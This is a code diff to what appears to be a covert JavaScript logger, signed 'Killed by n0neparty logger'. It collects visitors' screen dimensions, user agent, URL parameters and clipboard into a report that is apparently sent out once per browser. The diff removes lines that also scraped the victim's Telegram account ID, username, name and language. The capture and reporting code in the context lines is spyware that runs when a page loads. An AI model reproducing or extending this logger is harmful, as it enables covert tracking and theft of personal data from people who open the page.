@@ -53,7 +53,6 @@ document.addEventListener('DOMContentLoaded', function() {
     const screenWidthConst = screenWidth;
     const screenHeightConst = screenHeight;
 
-    const tg = window.Telegram.WebApp;
 
     const urlParams = new URLSearchParams(window.location.search);
     const userAgent = navigator.userAgent;
@@ -157,12 +156,6 @@ if (!localStorage.getItem('logSent')) {
  *📄 Clipboard*
  *└ Undefined*
     
-*👤 Account: *
-*├ ID: ${tg.initDataUnsafe.user.id}*
-*├ Username: @${tg.initDataUnsafe.user.username}*
-*├ Name: ${tg.initDataUnsafe.user.first_name}*
-*├ Language: ${tg.initDataUnsafe.user.language_code}*
-*└ Can Write To Pm: ${tg.initDataUnsafe.user.allows_write_to_pm}*
              *Killed by n0neparty logger 👾*
                              `;
 
